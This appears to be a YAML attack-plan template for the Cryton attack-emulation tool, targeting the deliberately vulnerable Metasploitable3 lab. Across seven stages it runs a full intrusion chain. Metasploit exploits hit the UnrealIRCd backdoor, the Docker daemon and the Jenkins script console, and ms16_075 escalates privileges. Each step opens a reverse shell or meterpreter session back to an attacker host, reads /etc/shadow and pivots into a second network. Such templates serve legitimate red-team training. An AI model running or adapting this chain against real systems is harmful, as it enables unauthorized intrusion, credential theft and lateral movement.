---
# This template contains an attack scenario that is compatible with the *metasploitable3*.
# To use it, you must have *Vagrant* and *Virtualbox* installed. For more information see the `Vagrantfile`.
# To run the Vagrant configuration use `vagrant up` in the same directory as the `Vagrantfile`.
# Make sure the parameters in the `inventory.yml` file are correct!
# In the current template we first scan the network with the ubuntu machine, get session using the IRCD backdoor, 
# and get root privileges using the Docker daemon exploit. Afterwards we get data from the machine.
# Next we set up routing tables, and move to the second network. There we find a Windows machine, exploit it using 
# a known Jenkins vulnerability, get root access using ms16_075_reflection_juicy, and gather data about the system.
# Required modules: metasploit, command, nmap.

plan:
  name: Metasploitable3 example
  owner: Cryton
  stages:
    # Stage 1
    - name: network-one-information-gathering
      trigger_type: delta
      trigger_args:
        seconds: 0
      steps:
      - name: ubuntu-nmap-scan
        is_init: true
        step_type: worker/execute
        meta:
          action: Scan the first network (for faster scans we use only the machine ip) for common ports
          target: Ubuntu
        arguments:
          module: nmap
          module_arguments:
            target: {{ ubuntu.host }}
            options: -T4

    # Stage 2
    - name: exploit-ubuntu
      trigger_type: delta
      trigger_args:
        seconds: 10
      depends_on:
        - network-one-information-gathering
      steps:
      - name: exploit-ircd
        is_init: true
        step_type: worker/execute
        meta:
          target: Ubuntu
          action: Exploit IRCD backdoor
        arguments:
          create_named_session: session-ircd
          module: metasploit
          module_arguments:
            module_type: exploit
            module: unix/irc/unreal_ircd_3281_backdoor
            module_options:
              RHOSTS: {{ ubuntu.host }}
              RPORT: 6697
            payload: cmd/unix/reverse_perl
            payload_options:
              LHOST: {{ attacker.host }}
              LPORT: 4445
        next:
          - type: result
            value: OK
            step: exploit-dockerd-privesc

      - name: exploit-dockerd-privesc
        step_type: worker/execute
        meta:
          target: Ubuntu
          action: Privilege escalation
        arguments:
          create_named_session: session-ubuntu-root
          module: metasploit
          module_arguments:
            session_target: {{ ubuntu.host }}
            module_type: exploit
            module: linux/local/docker_daemon_privilege_escalation
            module_options:
              SESSION: $exploit-ircd.session_id
            payload: linux/x64/meterpreter/reverse_tcp
            payload_options:
              LHOST: {{ attacker.host }}
              LPORT: 4446

    # Stage 3
    - name: gather-data-from-ubuntu
      trigger_type: delta
      trigger_args:
        seconds: 20
      depends_on:
      - exploit-ubuntu
      steps:
        - name: ubuntu-get-system-info
          step_type: worker/execute
          is_init: true
          meta:
            target: Ubuntu
            action: Get system info
          arguments:
            use_named_session: session-ubuntu-root
            module: command
            module_arguments:
              cmd: sysinfo
          next:
            - type: result
              value: OK
              step: ubuntu-get-etc-shadow

        - name: ubuntu-get-etc-shadow
          meta:
            target: Ubuntu
            action: Get /etc/shadow
          step_type: worker/execute
          arguments:
            use_named_session: session-ubuntu-root
            module: command
            module_arguments:
              cmd: cat /etc/shadow
          next:
            - type: result
              value: OK
              step: ubuntu-get-process-list

        - name: ubuntu-get-process-list
          meta:
            target: Ubuntu
            action: Get list of running processes
          step_type: worker/execute
          arguments:
            use_named_session: session-ubuntu-root
            module: command
            module_arguments:
              cmd: ps

    # Stage 4
    - name: network-pivoting
      trigger_type: delta
      trigger_args:
        seconds: 25
      depends_on:
      - gather-data-from-ubuntu
      steps:
        - name: get-interfaces
          is_init: true
          step_type: worker/execute
          meta:
            target: Ubuntu
            action: Get host interfaces
          arguments:
            use_named_session: session-ubuntu-root
            module: command
            module_arguments:
              cmd: ifconfig
          next:
            - type: result
              value: OK
              step: update-msf-routing-table

        - name: update-msf-routing-table
          meta:
            target: Ubuntu
            action: Update MSF routing table
          step_type: worker/execute
          arguments:
            module: metasploit
            module_arguments:
              module_type: post
              module: multi/manage/autoroute
              module_options:
                CMD: autoadd
                NETMASK: 255.255.255.0
                SESSION: $exploit-dockerd-privesc.session_id

    # Stage 5
    - name: network-two-information-gathering
      trigger_type: delta
      trigger_args:
        seconds: 30
      depends_on:
      - network-pivoting
      steps:
      - name: scan-windows-host
        meta:
          target: Windows
          action: Scan the second network (for faster scans we use only the machine ip) for desired ports
        step_type: worker/execute
        is_init: true
        arguments:
          module: metasploit
          module_arguments:
            module_type: auxiliary
            module: scanner/portscan/tcp
            module_options:
              PORTS: 20-25,53,80,135,443,3389,8000,8080,8443,8888
              RHOSTS: {{ windows.host }}
              TIMEOUT: 50

    # Stage 6
    - name: exploit-windows
      trigger_type: delta
      trigger_args:
        seconds: 40
      depends_on:
      - network-two-information-gathering
      steps:
        - name: exploit-jenkins
          meta:
            target: Windows
            action: Exploit Jenkins service
          step_type: worker/execute
          is_init: true
          arguments:
            create_named_session: session-jenkins
            module: metasploit
            module_arguments:
              module_type: exploit
              module: multi/http/jenkins_script_console
              module_options:
                RHOSTS: {{ windows.host }}
                RPORT: 8484
                TARGETURI: /
              payload: windows/meterpreter/reverse_tcp
              payload_options:
                LHOST: {{ attacker.host }}
                LPORT: 4447
          next:
            - type: result
              value: OK
              step: exploit-ms16-reflection-juicy

        - name: exploit-ms16-reflection-juicy
          meta:
            target: Windows
            action: Privilege escalation
          step_type: worker/execute
          arguments:
            create_named_session: session-windows-root
            module: metasploit
            module_arguments:
              session_target: {{ attacker.host }}  # This is due to the nature of the exploit
              module_type: exploit
              module: windows/local/ms16_075_reflection_juicy
              module_options:
                SESSION: $exploit-jenkins.session_id
              payload: windows/meterpreter/reverse_tcp
              payload_options:
                LHOST: {{ attacker.host }}
                LPORT: 4448

    # Stage 7
    - name: gather-data-from-windows
      trigger_type: delta
      trigger_args:
        seconds: 60
      depends_on:
      - exploit-windows
      steps:
        - name: windows-whoami
          is_init: true
          step_type: worker/execute
          meta:
            target: Windows
            action: Get user and its privileges
          arguments:
            use_named_session: session-windows-root
            module: command
            module_arguments:
              cmd: execute -f whoami -i -a /all
          next:
            - type: result
              value: OK
              step: get-tasklist

        - name: get-tasklist
          step_type: worker/execute
          meta:
            target: Windows
            action: Get tasklist
          arguments:
            use_named_session: session-windows-root
            module: command
            module_arguments:
              cmd: execute -f tasklist -i
